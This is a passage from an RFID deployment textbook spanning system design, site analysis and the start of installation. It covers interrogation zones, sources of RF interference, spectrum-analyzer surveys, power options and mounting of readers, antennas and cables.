antennas. Because of the turntable, the reader antenna has two advantages:
■ 
As the pallet spins, it can make multiple attempts to read a tag.
■ 
It gets opportunities to read tags in various orientations.
Because a stretch wrap station is usually the ﬁ nal step before shipping, an RFID system 
at this place guarantees the integrity of the containers.
Item-level tracking can be done at the point of sale.
Point-of-Sale Systems
An RFID point-of-sale (POS) system consists of scanning and payment capabilities. The RFID 
scanning technology used in POS systems can scan a whole shopping cart of goods or a 
basket full of items, say grocery items, in a few seconds. Here is how it works: As a customer 
pushes her cart to a designated checkout area, the readers mounted in the area collect the 
information about the products and their quantity in the cart. The readers send the information 
to the payment system, which displays the amount to be paid. The customer, at this point, 
can cancel the transaction or make payment through a credit or debit card. This payment 
transaction feature is built into the POS system.
Following are the beneﬁ ts offered by the RFID POS system:
■ 
Cost saving by eliminating the need for cash counter operators
■ 
All stock-related store records can be updated in real time by taking feed from the 
RFID system.
■ 
The possibility of shoplifting is reduced because all items going out of the shop can 
be tracked by appropriately setting up the checkout areas.

 
Selecting the RFID System Design • Chapter 6 
143
■ 
Stock can be replenished efﬁ ciently by examining stock-out reports any time.
In addition to point of sale, retailers might also need to keep track of items on 
the shelves.
Smart Shelf
A smart shelf is a shelf that has readers mounted on it to read tags on the items on the shelf. 
When a customer picks up a tagged item from the shelf, the reader can no longer read the 
tag of this item, and this information ﬂ ows to the inventory system, which assumes that 
the item has been removed from the shelf. Depending on its features and conﬁ guration, 
the inventory system might take further action, such as notifying store personnel to put 
more items on the shelf to avoid an out-of-stock situation. Here are some advantages of 
a smart-shelf system:
■ 
Efﬁ ciently notiﬁ es store personnel of misplaced items
■ 
Helps reduce out-of-stock situations
■ 
Helps maintain better efﬁ ciency in inventory management
■ 
Helps determine the sale potential of an item in a timely fashion
Looking at the other side of the coin, following are the disadvantages of a smart-shelf 
system:
■ 
Because a smart-shelf system uses stationary readers and tracks individual items, lots 
of readers and tags would be needed. Therefore, cost becomes a signiﬁ cant factor to 
consider.
■ 
Multiple reader antennas required in the same shelf could introduce overlapping 
interrogation zones and therefore interference of signals.
■ 
If the items are densely packed on a shelf, stationary readers could miss some items, 
resulting in inventory issues.
The three most important takeaways from this chapter are the following:
■ 
Read range and read speed increase with increase in frequency, whereas the passive 
tag size and ability to read near water or metal decrease with increase in frequency.
■ 
Operating frequency, read performance, ruggedness, compliance with standards, 
operating conditions, and ability to upgrade are some main factors considered in 
selecting hardware components such as tags and readers.
■ 
The selection of an RFID portal (where readers will be mounted) depends on 
the type of tracking (case level or item level) and the application. The goal is to 
maximize read performance.

144 
Chapter 6 • Selecting the RFID System Design
Summary
You’ll want to design your RFID system to meet application performance requirements. 
The task of designing your RFID system includes selecting the operating frequency; 
selecting hardware components such as readers, tags, and antennas; and selecting portals 
where the readers will be mounted to read the tags.
The three main factors that help you select the operating frequency for your RFID 
system are application type, required read range, and operating conditions. Some main factors 
considered in selecting readers and tags are operating frequency, read performance, ruggedness, 
compliance with standards, operating conditions, and ability to upgrade. The selection of an 
RFID portal (where readers will be mounted) depends on the type of tracking (case level 
or item level) and the application. The goal here is to maximize read performance. Some 
examples of pallet-level read portals are dock doors and forklifts, whereas an example of 
a portal for case-level reading is a conveyor. Some examples of item-level portals are smart 
shelves and POS systems.
After you select the operating frequency for your RFID system, you will need to identify 
the potential sources of interference around this frequency. In other words, your design is not 
ﬁ nal until you do a site analysis, which we’ll discuss in the next chapter.

Chapter 7 • Performing Site Analysis
Introduction
The RFID system that you are designing will most probably be installed in an already existing 
infrastructure that contains other systems and devices. You need to determine how this RFID 
system will ﬁ t into that existing site infrastructure. For this reason. A site analysis is required 
before you ﬁ nalize the RFID system design and before you install the RFID system. To aid 
you in this task, you can use a blueprint to visualize the site’s physical infrastructure. You will 
need to analyze the site’s physical infrastructure and RF environment to ﬁ nd appropriate 
locations for the interrogation zones or to mark the planned interrogation zones.
The main goal of the site analysis is to ensure that the interrogation zones will function 
properly, with maximum performance and without interrupting the existing services. Depending 
on the situation, you could have no freedom in choosing these zones, full freedom in choosing 
these zones, or somewhere in between these two extremes. Even if you have no freedom in 
choosing a zone, there could still be a degree of freedom to decide where exactly in the zone 
you will mount the reader antenna. So, regardless of how much freedom you have to determine 
the location of interrogation zones, a site analysis will be useful and required.
So, the core question in this chapter is: How can we perform a successful site analysis? 
In search of an answer, we will explore three avenues: performing physical environmental 
analysis, performing RF environmental analysis, and documenting and using our ﬁ ndings.
Planning the Site Analysis
Due to its very nature, an RFID system is almost always installed in an already existing 
infrastructure that contains other systems and devices. The purpose of the site analysis 
is to determine how your RFID system will ﬁ t into an already existing world at the site. 
To ensure that all aspects of the site analysis are addressed and to optimize your results, 
treat your site analysis like a project and therefore plan it. Planning a site analysis includes 
determining what this analysis will include and what will be its deliverables.
Plan the Steps Ahead
So, what is involved in performing a site analysis? This might slightly depend on the site and 
the requirements of the RFID system that will be installed. However, in general, your site 
analysis will include the following steps:
1. Plan blueprints Arrange the blueprints, which are basically the site diagrams that 
you will need to visualize the site infrastructure. You will also develop (or modify) 
blueprints at the end of your project to include your ﬁ ndings. So, blueprints are 
input to the site analysis project, and they are also the project deliverables.
2. Inspect the site Inspecting the site includes walking through the site and making 
observations for physical and electrical environmental analysis—for example, taking 
notes on any potential obstructions that can reﬂ ect or block the RF signal.

 
Performing Site Analysis • Chapter 7 
149
3. Determine interrogation zones This involves determining the spots where you 
can mount readers for reading tags. This step will help you avoid installing expensive 
readers or antennas at places where they will not be effective or where they will not 
be needed. If the location for an interrogation zone is already ﬁ xed, you will need to 
determine where exactly in that location you will install the reader antenna.
4. Document your results You will document the results of your site analysis in reports 
and in the form of blueprints. These are the deliverables of your site analysis project.
If you want to hit the ground running, you need to understand what blueprints are.
Understanding Blueprints
The ﬁ rst step of a site survey is to obtain the facility diagram, also called a blueprint. A blueprint, 
in general, is any plan that documents an architecture or an engineering design. A site 
blueprint helps you visualize the big picture of the site infrastructure. It will help you make 
a preliminary determination of where you can possibly set up the interrogation zones. Typically, 
standard symbols are used on the blueprint to represent various items. Figures 7.1 and 7.2 
show very simple examples of a warehouse blueprint and some electrical and telecom symbols 
commonly used in blueprints.

Chapter 7 • Performing Site Analysis
The blueprint will give you the preliminary idea about the locations that you want to 
avoid while setting up interrogator zones, such as metallic material, and the things that you 
can use, such as breakout boxes, circuit breakers, and power drops. You also need to consider 
power availability, backup power source, availability of dedicated power circuits, and location 
of power outlets.
So, the blueprint shows you what physical infrastructure is in place. But it’s only the starting 
point. Next, you need to visit the facility and analyze the physical environment of the site.
Performing a Physical Environmental 
Analysis
Mounting interrogators and thereby setting up interrogation zones is an important task in 
deploying an RFID system. The interrogator zones are set up in a physical space. Therefore, 
you ﬁ rst want to analyze the physical environment in which you are going to set up the 
interrogation zones. The physical environment that you are concerned with may consist of hindering 
characteristics or objects, such as extreme temperatures, moisture, high-power machinery, 
metallic equipment, and lighting ﬁ xtures. To perform the physical environmental analysis, you 
might need to consider various physical conditions described in the following sections.
Harsh Environmental Conditions
While setting up interrogation zones, you should consider harsh environmental conditions, 
including corrosive chemicals, extremely high or low temperature, humidity, and mechanical 
shocks, which can damage tags. Moisture and water contents can absorb RF signals emitted 
by readers and tags.

Physical Obstructions
A physical obstruction is an object that blocks the communication path between an 
interrogator and a reader. Examples of physical obstructions are beams, equipment, products, 
and electric motors. Depending on the nature of the physical obstruction, it can create 
adverse effects such as absorption, reﬂ ection, scattering, and interference.
Metallic Material
Metallic objects reﬂ ect RF signals, and that reﬂ ection can cause interference with the incident 
signal. You need to keep metallic objects such as casings outside the interrogation zones. The 
metallic parts of the RF system itself will also reﬂ ect RF energy. The solutions are to not 
choose the metallic part when you have an option and to create air gaps or use nonmetallic 
spacers to separate the metal. You might also need to adjust the distance between a reader 
and a tag to avoid the reﬂ ection effect.
TIP
All antennas and interrogators are securely mounted with the appropriate 
hardware. You must consider adverse effects such as reﬂ ection and interference 
while you’re selecting the hardware to hold the equipment. For example, avoid 
using metal brackets.
Packaging
Given its nature, packaging can absorb, reﬂ ect, or scatter RF energy and thereby hamper the 
performance of an RFID system.
Cabling
You should make sure that the power and network cables will stay away from the interrogator 
zones, to avoid some adverse effects such as noise and interference.
Electrostatic Discharge
Electrostatic discharge, or ESD, is the instantaneous electric current created by the ﬂ ow of 
electrons from a high-density (of electrons) surface to a low-density surface—for example, 
when the two surfaces rub against each other. ESD could gradually degrade (damage) a 
system component. In the environment of an RFID system, the common sources of ESD 
include belts, conveyors, rollers, paper handling, and striping labels from rolls. ESD can damage 

152 
Chapter 7 • Performing Site Analysis
the transistors in a tag’s IC, thereby causing the tag to malfunction. ESD can also damage the 
interrogator’s IC, especially if the interrogator is not properly grounded.
Performing an RF Environmental Analysis
The RF environmental analysis includes identifying the sources of EM noise and interference 
that can hamper the performance of the proposed RFID system. The increasing use of EM 
waves to communicate has revolutionized communication capabilities and options to include 
cordless communication devices, satellite communication systems, and wireless networks. 
Looking at the other side of the coin, the increase in EM radiation in the environment can 
cause these waves to interfere with each other, which will disrupt operations and services. The 
purpose of the RF environmental analysis is to identify the potential sources of interference at 
and around the selected operating frequency of the proposed RFID system. If these sources 
stay unidentiﬁ ed and therefore the resulting problems unsolved, the interference will disrupt 
the communication between the readers and the tags, and it will consume lots of your time 
and resources to troubleshoot the problems of the running system.
The purpose of the RF environmental analysis is twofold:
■ 
Eliminate any interference inside the interrogation zone.
■ 
Ensure that the RFID system (tags and interrogators) will not interfere with the 
existing RF systems on the site.
TIP
If you are a beginner, consider accepting the help of an experienced RF engineer 
in performing the RF site survey. After going through trials and errors during 
multiple surveys, you will start feeling comfortable with doing it yourself.
Interference can have adverse effect on the following characteristics of an RFID system:
■ 
Read speed
■ 
Accuracy of communication
■ 
Read range
You are looking for the EM systems on the site that can generate signals (or noise) in or 
around the same frequency range as that of the proposed RFID system and thereby cause 
signal interference. To deal with these electrical environmental conditions, you need to 
perform the following tasks:

 
Performing Site Analysis • Chapter 7 
153
■ 
Identify the interference sources.
■ 
Understand different interference types.
■ 
Determine the ambient noise.
■ 
Analyze these electrical environmental conditions.
■ 
Design solutions for the discovered problems.
All these tasks are explained in the following sections. First, to identify the sources 
of this interference, you need to perform a site test before deploying the RFID system. 
This site test is called a site assessment or site survey.
Planning a Site Survey
Following are the apparatus that you will need to perform a successful site survey:
■ 
A blueprint or a computer-aided drawing (CAD) drawing to visualize the site 
infrastructure
■ 
An antenna that will cover 360 degrees of RF ﬁ eld, such as a half-wavelength 
dipole antenna
■ 
A spectrum analyzer to measure noise and interfering signals
■ 
A portable computer such as a laptop to record the collected data
■ 
Two stands, such as tripod stands, to support the antennas
■ 
A cart on which you can move your testing equipment around the site
Interference can come from a variety of sources. You should be aware of the types of 
interference that can come from the environment to impair the communication between 
readers and tags (or any RF communication, for that matter). Following are the common 
types of such interference:
■ 
Adjacent channel interference This is the interference from a signal with 
a frequency close to the operating frequency of the RFID system. So, this is the 
interference between two frequency channels (bands).
■ 
Band congestion interference This is the interference resulting from the 
overcrowding of a given frequency band—that is, too many devices operating 
within a shared frequency band.
■ 
Environmental interference This is the interference from natural sources of 
EM radiation, such as lightning and solar radiation.

Jamming This is the interference or the noise caused by an intentional emission 
of radiation by another device or system. This is done to limit the effectiveness of 
the other communications or detection equipment. For example, cellular phone 
jammers are used in locations where a phone call will be disruptive, such as in 
libraries and movie theaters.
■ 
Spurious emissions interference Spurious emissions are the interfering radiation 
transmitted outside the operating frequency band in the form of narrowband 
signals or wideband noise. One example of spurious emissions is the emission 
of harmonics at multiples of fundamental frequency.
NOTE
The harmonic of a wave is a component frequency of the signal that is an 
integer multiple of the fundamental frequency.
To fully estimate the risk and impact of the RF environment, knowledge of the ambient 
noise is of particular importance.
Determining the Ambient EM Noise
The ambient EM noise (AEN) is the EM noise existing at a given location, such as a compartment, 
a room, or a particular outdoor location. AEN is generated by electrical devices such as 
infrared scanners, real-time location systems (RTLS), and alarm motion detectors. The AEN 
is measured in dB relative to some reference value—for example, the average power.
NOTE
The term ambient refers to the immediate surroundings of something. 
It comes from the French word ambiant and its roots go further back, 
to Latin.
The AEN can be measured by using a device called spectrum analyzer, which in general is 
used to examine the spectral composition of a an EM wave. Figure 7.3 shows an example of 
output from a spectrum analyzer: the Agilent 89600 Vector Signal Analyzer, a sophisticated 
device that displays the overall RF spectrum as well as the analyses of its various aspects. You 
can use a spectrum analyzer to perform the following tasks:

 
Performing Site Analysis • Chapter 7 
155
■ 
Identify the source of RF interference.
■ 
Measure the RF output from circuits, devices, and instruments.
■ 
Measure the distortion, harmonic content, modulation quality, and noise.
■ 
Display signal interference if it overlaps the intended signal.

Analyzer (Image Courtesy of Agilent Technologies, Inc.)
So, in general, you can use a spectrum analyzer to analyze the electrical (RF) environmental 
conditions and estimate their effect on the system variables, including the following:
■ 
Antenna size
■ 
Composition of the tagged object

156 
Chapter 7 • Performing Site Analysis
■ 
Operating frequency
■ 
Power emitted by the interrogator
What should be the overall strategy to analyze the electrical environmental conditions, 
or the RF environment of the site?
Analyzing the Electrical Environmental Conditions
Performing an analysis of the electrical environmental conditions—that is, RF environmental 
analysis—includes the following:
■ 
Identify the AEN.
■ 
Measure the strength of interfering signals and noise. You need to identify these 
sources of interference and collect data with the help of a spectrum analyzer over a 
full operational business cycle, which typically is a minimum of 24 to 48 hours. 
This analysis, which is called a full Faraday cycle analysis (FFCA), will tell you what 
frequencies will cause the most problems when you operate your RFID system in 
your facility.
■ 
Map the interrogation zones to the site drawings, such as blueprints, and ensure that 
these zones are noise free.
■ 
After you identify a device that might create EM noise, turn on this device and 
measure and record the results in the interrogation zone nearby.
NOTE
To capture the RF signal, you can place an antenna in the middle of the 
interrogation zone and connect it to the input of the spectrum analyzer.
So, you have performed a site survey to identify the sources of interference and AEN, and 
you have estimated the effect of interference on the system variables. What will you do next?
Protecting the RFID System from Interference 
and Noise
Once you know that your system will have interference (or noise) problems, you can start 
designing the solutions. To eliminate or minimize the effects of interference, you can 
consider implementing the following solutions:

 
Performing Site Analysis • Chapter 7 
157
■ 
Remove the source of interference If it is possible to remove the source of 
interference, go ahead and do it. For example, it might be possible to ensure that 
a forklift or an electronic scale causing the interference does not operate in the 
interrogation zone.
■ 
Shield the source or RFID system You can shield the RFID system or 
components to protect them from intentional or accidental interference, or you 
can shield the source of interference.
■ 
Use ﬁ lters You can use ﬁ lters, which permit only selected frequencies to pass 
through a connected device by rejecting all other frequencies.
■ 
Avoid grounding loops A grounding point is used to ensure the safety of the 
equipment and the operator. It also provides immunity to interference and noise. 
However, a grounding point can create a loop condition, which will cause energy 
transfer back to the connected devices and thereby interference and noise. This can 
be avoided by ensuring that a loop condition does not exist—for example, by 
ensuring that the conductor used for grounding is short enough.
Just like any other project, the site analysis is not complete without its deliverables. One 
of the deliverables of this project will be your own blueprint, or site diagram, containing the 
RF information useful for the installation of the RFID system.
Preparing Your Own Blueprints
You started from a blueprint, inspected the site to observe the physical and electrical 
environment, and at the end the whole survey will narrow down to the interrogation zones. 
In other words, after performing the physical and electrical site survey, you need to make 
some tests on the planned interrogation zones. You should record your results in your own site 
blueprint and in a report. These results will be used during installation of your RFID system.
Let the Experiment Begin
Consider a scenario in which you want to determine the coverage areas of antennas 
(interrogation zones) at various locations inside a warehouse. Typically, a warehouse will have 
dock doors, metal shelves, a stockroom with liquid and metallic material, trailers, and walls. All 
these obstacles affect the RF signal in different ways and different amounts, which are not known 
in advance. So, tests are necessary to determine the RF coverage pattern near these places.
Perform the following steps to measure the RF coverage areas for the reader antenna at 
different spots in the warehouse:
1. Choose a spot and set up an antenna for which the coverage area needs to be 
measured.

158 
Chapter 7 • Performing Site Analysis
2. Use a spectrum analyzer to measure the strength of the signal emitted by the 
antenna. Take readings at several points in the same direction, starting from near the 
antenna and gradually moving away from it.
3. Make sure you record your readings. You will note that the signal strength decreases 
with an increase in distance from the antenna.
4. When you move far enough so that the signal strength is below a useful level, mark 
that point.
5. Repeat Steps 2 through 4 as many times as necessary to take readings in different 
directions of interest. These readings will mark the interrogation zone around the antenna.
6. Repeat Steps 1 through 5 as many times as necessary to mark the coverage areas 
(interrogation zones) at different spots.
You may be testing the spots (for coverage area) near the ofﬁ ce areas, trolleys, and metal 
shelves; and you will observe the effects. Record your results into the site blueprint by 
showing the locations—for example, with the following coverage grading:
■ 
Maximum coverage
■ 
Minimum coverage
■ 
Intermediate coverage
You will notice that the signal coverage area will decrease around spots near obstructions, 
such as metallic equipment.
Once you have determined the location of an interrogator zone, you can perform on it 
what is called path loss contour mapping (PLCM) by performing path loss contour analysis (PLCA). 
PLCA is the process of determining how the ﬁ eld strength and shape of the RF coverage in 
an interrogation zone varies. In other words, PLCA data has the information about how the 
RF signals (waves) are degraded and distorted and how the wavefront (the shape of coverage) 
changes throughout the interrogation zone. PLCM is the process of preparing a blueprint that 
maps the PLCA data. The PCLA helps determining the following deployment variables:
■ 
The location of the antenna in the interrogation zone
■ 
Antenna alignment
■ 
Setting of the emitted power
So, PCLM is used to ﬁ ne-tune and conﬁ gure a given interrogation zone for optimal 
performance, whereas FFCA is used to locate an interrogation zone.
You will also make sure that any potential barriers that can affect RF signal propagation 
are also entered into the blueprint (or some other document). Following are some examples:

 
Performing Site Analysis • Chapter 7 
159
■ 
Doors
■ 
Electrical connections
■ 
Metallic equipment
■ 
Shelves
■ 
Liquids and areas of high humidity
■ 
Sources of interference and noise
After you have recorded your ﬁ ndings into the blueprint or elsewhere, you can use them 
to make installation decisions to facilitate error-free data transfer between tags and readers.
Using the Results of Your Experiment
This is how you can use the results of your experiment during the installation and deployment 
of the RFID system:
■ 
Choose an antenna location that is free from obstacles.
■ 
For a given area where tagged objects will be placed (or passing through), choose 
a spot for the antenna that maximizes the propagation pattern.
■ 
Mount the antenna high enough to increase the horizontal coverage by RF 
signals.
■ 
Use the results from PLCA to ﬁ ne-tune the antenna.
■ 
Choose a mounting spot for a reader that can accommodate cables for data transfer 
and electrical connections.
■ 
Shield devices that generate RF, to prevent radiation leakage.
■ 
Ensure that the users in the area know of the possible radiation hazard, and take steps 
to prevent excessive human exposure to the radiation by following the regulations.
The three most important takeaways from this chapter are the following:
■ 
Physical environmental analysis is used to identify physical obstructions that can 
hamper the performance of your RFID system.
■ 
RF environmental analysis is used to identify the sources of EM noise and 
interference that will hamper the performance of your RFID system and to measure 
the RF coverage in the planned interrogation zones.
■ 
You should document your ﬁ ndings with adequate details and start determining the 
solutions to the discovered problems.

Chapter 7 • Performing Site Analysis
Summary
The purpose of site analysis is to determine how the proposed RFID system will ﬁ t into the 
existing site infrastructure. A blueprint, the site diagram, helps you visualize the site 
infrastructure. With this document as a starting point, the site analysis project has three stages: 
physical environmental analysis, RF environmental analysis, and documenting the results of 
your analysis. The physical environmental analysis includes recording harsh environmental 
conditions, physical obstructions, metallic materials, and other physical sources that may have 
adverse effects on the RF signal propagation. The RF environmental analysis includes 
identifying the sources of interference and noise. You also need to measure the interference 
and noise in the planned interrogation zones. The spectrum analyzer is your device to make 
these measurements.
You should take signal strength measurements in the planned interrogation zones to mark 
the coverage area. You must document your ﬁ ndings with adequate details. Some of these 
ﬁ ndings, such as the RF coverage information, can go into the blueprints. You will use 
these ﬁ ndings during installation, which is discussed in the next chapter.

Chapter 8 • Performing Installation
Introduction
After selecting a system design, as discussed in Chapter 6, and performing a site analysis, as 
discussed in Chapter 7, you are now ready to install your RFID system. Think of installation 
as a process and not as an isolated task. The results from system design and site analysis are 
the input to the installation process. Installing hardware components and testing them are 
essential parts of deploying an RFID system. Before you actually install the hardware com-
ponents, you should consider different installation scenarios and choose the one that best 
suits the given environment.
So, the core question in this chapter is: How can we successfully install an RFID 
system? In search of an answer, we will explore three avenues: planning installation, 
installing and testing hardware components, and considering various installation 
scenarios.
Preparing for Installation
Given the cost and the importance of an RFID system, its installation must be performed 
in a planned way to achieve the optimal results. An RFID installation is a process that begins 
when you start selecting the system design, which involves understanding various RFID 
solutions available in the context of application requirements. Equipped with that 
understanding, you perform the site analysis, which involves determining how the RFID 
system will ﬁ t into the existing site infrastructure. As Figure 8.1 depicts, the system design 
is not complete until the site analysis is performed. You use the information collected during 
system design and site analysis to install the system.

Preparing for installation includes once again considering all the system variables to put 
together an RFID solution, considering power sources for the system, and following the 
standard industry practices in installing the RFID system.
Putting Together an RFID Solution
Obtaining the components and installing an RFID system could be a very involved exercise. 
Although RFID is still an emerging and evolving technology, already several RFID solutions are 
available from multiple vendors. So what do you take and what do you leave? We discussed this 
issue in Chapter 7 to some extent. The bottom line is: It basically depends on the business require-
ments of the application for which you are deploying the RFID system. The requirements of the 
RFID system (the solution) that you install could also be inﬂ uenced by the following factors:
■ 
The site infrastructure
■ 
The type of products that will be tracked by the RFID system
■ 
The physical location where the RFID system is to be installed
You will make choices related to a number of important elements of the system; let’s call 
them system variables because you have some freedom to choose them. After they are chosen, 
they will collectively deﬁ ne the system. These system variables that you must consider during 
installation are shown in Table 8.1.

Chapter 8 • Performing Installation
Most of the variables listed in the table have already been discussed in previous chapters 
because they also need to be considered during the system design selection. Deploying an 
RFID solution includes system design, site analysis, and installation. It can also include 
hardware/software integration, conﬁ guration, and user training.

TIP
Various RFID vendors these days offer solutions for different scenarios, and 
some of them also offer installation services.
To operate, the system needs power. Where will the power come from?
Considering Power Sources
The readers and tags need power for their operation. Passive tags get their power from the 
RF signal emitted by the reader, whereas active tags have their own power source, typically 
a battery. Readers can use various power sources, including power supply units (PSUs), 
uninterrupted power supply (UPS), and power over Ethernet (POE).
Batteries
Active tags attached to items to be tracked and identiﬁ ed typically use batteries. Because a 
battery has a ﬁ nite lifetime, it gives a tag a longer read range compared to passive tags, but 
they have a limited lifetime, typically up to 10 years. The application could determine 
what kind of battery should be used. For example, in toll applications, batteries should be 
able to withstand typical temperatures from −40° C to 80° C. In applications involving 

 
Performing Installation • Chapter 8 
167
harsh environmental conditions such as tracking wildlife, the batteries used in the tags 
must be able to withstand even wider temperature ranges.
Power Supply Units
An electrical power supply unit, or PSU, is a device or system that supplies electrical energy to 
an output load or group of loads. The complete range of power supplies is very broad. You 
should be aware of the following two kinds:
■ 
Linear power supply A linear power supply unit can be used as an AC-to-DC 
converter. A simple linear power supply unit powered with AC uses a transformer 
to convert the voltage—for example, from a wall outlet—to a lower DC voltage. 
Depending on the output load requirements, a linear regulator can be used to 
reduce the voltage to the desired output voltage. This power supply also provides 
other features such as current limiting.
■ 
Switched mode power supply A switching power supply unit can be used as a 
DC-to-DC converter. In this case, the power supply is designed to accept a DC 
input from a limited range and to output a different DC voltage. This is especially 
useful in portable devices as well as for power distribution in large electronic 
equipment.
Uninterruptible Power Supplies
An uninterruptible power supply, or UPS, is a device that maintains a continuous supply of 
electric power to the connected equipment by supplying power from a battery when the 
utility power becomes unavailable. A UPS is inserted between the source of power and the 
output load that needs to be protected. When an abnormality such as a power failure occurs, 
the UPS automatically switches from the utility power to the battery power.
CAUTION
The switching power supply can generate noise, with some harmonics falling 
in the neighborhood of 125 KHz, which is the operating frequency for LF 
RFID systems. In that case, you might prefer to use a linear power supply.
Power Over Ethernet
The power over Ethernet (POE) technology system is any system that transmits electrical 
power along with data—for example, to remote devices over standard twisted-pair cable in 

168 
Chapter 8 • Performing Installation
an Ethernet network. This technology can be used for powering Ethernet hubs, IP 
telephones, Webcams, wireless access points, and other devices where it might not be 
convenient to supply power separately.
You should check out whether the company where you are going to install the RFID 
system already has implemented a power solution that you can use. For example, some 
organizations might already have implemented the power distribution solution based on 
access ports used in Ethernet cabling. This system can also be used to deliver data and 
power to RFID components such as interrogators.
You should understand the industry-standard process and practices for the installation 
and follow them.
The Standard Installation Process and Practices
Because RFID technology is still evolving, deployment of an RFID system can be a 
challenging task. You can minimize the risks involved by following the standard industry 
process for the installation based on best practices. It’s important to consider installation as a 
process and not just as an isolated task. A process has an input, the actual tasks based on the 
input, and the output. In this case the input items are design selection and site analysis, the 
actual tasks are the installation tasks, and the output is the installed (deployed) system that 
will need to be managed. In the following sections we discuss all these elements.
Design Selection
The system design selection, discussed in Chapter 6, includes selecting operating frequency, 
hardware components, and types of RFID portal. This selection is largely driven by the 
application requirements and the environment in which the RFID system will operate. 
The environment is fully explored during site analysis, which is necessary to ﬁ nalize the 
design.
Site Analysis
Site analysis is performed to determine how the proposed RFID system will ﬁ t into the 
existing site infrastructure. The process includes examining physical obstructions and electri-
cal interference and noise. The goal is to mark the interrogation zones that can effectively 
coexist with the existing infrastructure. Equipped with the information from design selection 
and site analysis, you can start the installation tasks.
Installation Tasks
Installation tasks include installing hardware and possibly software components and testing 
the installed RFID system. While installing the system, you must consider and deal with 
three deployment issues:

 
Performing Installation • Chapter 8 
169
■ 
Coexistence The goal of a successful RFID implementation is that the RFID 
system effectively coexists with the existing site infrastructure. This means two 
things: The existing RF and other services are not disrupted by the RFID system, 
and the RFID system gets no or minimal interference or noise from the existing 
RF services. There is another dimension to coexistence: The RFID system 
components must work in harmony with one another. For example, you should 
consider the issues of interrogation zone overlapping.
■ 
Integration issues Integration has two components: applications and network 
infrastructure.
■ 
Integration with applications The core RFID system (readers and 
interrogators) are usually integrated with the applications that analyze the 
data collected by the core system. For example, you might need to connect 
a reader to a host computer that might be supporting or connected to a 
database system. Internet communication could also be a part of the 
integrated system. Depending on the application, data aggregation and 
synchronization might be important issues in this case.
■ 
Integration with an existing network Multiple readers can be grouped 
together into a network to connect them to one or more host computers. A 
network (wired, wireless, or both) could already be in operation at the site, 
and you will need to integrate the RFID system to this network. The avail-
ability and reliability of the network connections will be important issues here.
■ 
System tuning The readers and antennas are installed in different scenarios, such 
as conveyors, dock doors, and forklifts. In a given scenario, you should ﬁ ne-tune the 
system after its installation to achieve the optimal results. The ﬁ ne-tuning can 
include antenna positioning and alignment, adjusting antenna power emission 
within the legal limits, and so on.
System Management
During the installation, you must consider the system management-related issues; the RFID system 
will need to be managed after it is installed. Your choices during installation could affect system 
management after the installation is complete. Management includes the following components:
■ 
Cable management You will need cables for connections, such as connecting 
readers to the power source, antennas to the readers, and readers to the network or 
host computer, and so on. These readers may be in the neighborhood of other 
equipments and operations, so it’s important to consider the security and protection 
of the cables from possible damage and the safety of personnel from the cables.

170 
Chapter 8 • Performing Installation
■ 
Device management There could be management issues related to the readers 
and the host computers attached to the readers. These issues can include network 
connection and data transmission.
■ 
Data management You must anticipate what kind and volume of data is going 
to be collected by the RFID system. Ensure that the installed system is able to 
handle that data load.
The Tag Thing
You are installing the RFID system to read tags. Therefore, during the system installation, 
you must also consider what kind of tag the system will be reading and how the tags will be 
placed on the items.
You consider all these factors while planning your installation. After you’ve done the 
planning and made the required purchases, you are ready to start installing the hardware.
Installing Hardware
The ﬁ rst step in installing hardware is to compile at one place all the documentation, 
including information from the system design, information from the site analysis, and the 
manuals that came with the equipment that you purchased to install. You will be using this 
information throughout the installation process.
Installing hardware includes installing readers, installing antennas, and testing the 
interrogation zones. Here is the typical process for installing the core hardware for an 
RFID system:
1. 
Mount the reader.
2. 
Mount the antenna.
3. 
Install cables including connecting antenna to the reader.
4. 
Turn on the reader. Congratulations! You have an interrogation zone.
5. 
Test the interrogation zone.
CAUTION
During installation, keep your eyes open for any change that might have 
occurred in the site infrastructure after your site analysis. Such changes could 
require changes in your installation plan.
Now it’s time to ask that important question: Where do I install the readers?

 
Performing Installation • Chapter 8 
171
Installing Readers
As you know by now, a reader creates an interrogation zone in which it can read a tag. By the 
time of installation, you have already performed the site analysis to determine the interrogation 
zone. Recall that the location of an interrogation zone is determined by many factors, 
including the location of the tagged items to be read, sources of interference and noise, and 
sources of other adverse effects such as reﬂ ection and absorption. Once an interrogation 
zone has been marked, you have very little freedom in terms of where to mount the reader.
There are two main choices for mounting a reader. If the application requires it, a rack-based 
solution could be appropriate—for example, to withstand harsh environmental conditions. In 
this solution, a rack holds the antenna, reader, power supply such as UPS, and cables. The rack 
protects the system from harsh environmental conditions such as dust, humidity, and moisture.
The other solution is to mount the reader on some surface or edge, such as a wall or 
gantry placed around a conveyor. While using your freedom to choose the exact location to 
mount a reader, you must consider the following factors:
■ 
Breathing room You will need clearance of a few inches around the reader for 
cables and to keep the air ﬂ owing so that the reader will stay cool.
■ 
Dense interrogator environment By installation or conﬁ guration, or both, 
avoid the dense interrogator environment discussed in Chapter 4.
■ 
Environmental conditions Avoid spots of harsh environmental conditions, such 
as extreme temperature, humidity, and moisture.
■ 
Safety If there is lots of human movement in the area, choose a spot in which 
the reader will be safe from accidental physical damage.
■ 
Interference and noise The sources of AEN and RF interference, discussed in 
the previous chapter, also play roles in determining the exact location of a reader. 
The idea here is obviously to avoid the effects of AEN and interference.
We will discuss some installation scenarios later in this chapter. The reader creates and 
processes the signal, but the signal is transmitted and received by antennas connected to the 
reader.
Installing Antennas
Because antennas are communication elements, they are usually the most exposed components 
of an RFID system. Therefore, you must consider their protection from damage in your 
installation decisions. Obviously, an antenna will be mounted somewhere in or near the 
interrogation zone. RF path loss contour mapping (PLCM), discussed in the previous chapter, 
will help you determine the exact location of an antenna in a given interrogation zone 

172 
Chapter 8 • Performing Installation
and to conﬁ gure and ﬁ ne-tune the antenna. Depending on the situation, an antenna can be 
attached using drills and screws, or you might use a rack solution, as described previously.
Now you need to connect the antennas to their readers.
Installing Cables
An antenna is connected to a reader port via a cable. A reader typically has one, four, or eight 
antenna ports. Note that if the transmit and receive ports are separate, you will need two cables 
for each antenna, whereas if they are combined, only one cable per antenna will be needed.
You will also need cables for connecting other hardware components, such as power 
cables for the readers. Make sure you choose the right type of cable for each connection. 
Also consider possibly harsh conditions such as temperature or moisture (or mud) that the 
cables might need to put up with.
Use standard practices in installing cables, which including the following:
■ 
Use the correct standard cable for a given connection: labeled by the manufacturer, 
authenticated by a quality organization for the purpose for which it’s being used, or both.
■ 
Keep the cables away from sources of EM waves such as motors and electronic 
devices.
■ 
Use labels to identify the cables.
■ 
